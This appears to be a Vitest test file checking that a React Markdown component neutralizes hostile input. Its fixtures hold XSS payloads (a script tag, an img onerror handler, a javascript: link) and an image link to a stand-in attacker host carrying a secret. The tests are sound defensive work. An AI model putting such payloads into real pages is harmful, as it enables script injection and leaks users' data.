import { render } from '@testing-library/react'
import { expect, test } from 'vitest'
import { Markdown } from './Markdown'

test('HTML, scripts and javascript: links render inert', () => {
  const { container } = render(
    <Markdown text={'<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n[x](javascript:alert(1))'} />,
  )
  expect(container.querySelector('script')).toBeNull()
  expect(container.querySelector('img')).toBeNull()
  for (const a of container.querySelectorAll('a')) {
    expect(a.getAttribute('href') ?? '').not.toMatch(/^javascript:/i)
  }
})

test('GFM tables render as a table', () => {
  const { container } = render(<Markdown text={'| a | b |\n|---|---|\n| 1 | 2 |'} />)
  expect(container.querySelector('table')).not.toBeNull()
})

test('Markdown images are not loaded from outside servers', () => {
  const { container } = render(<Markdown text={'![x](https://evil.example/?d=secret)'} />)
  expect(container.querySelector('img')).toBeNull()
})
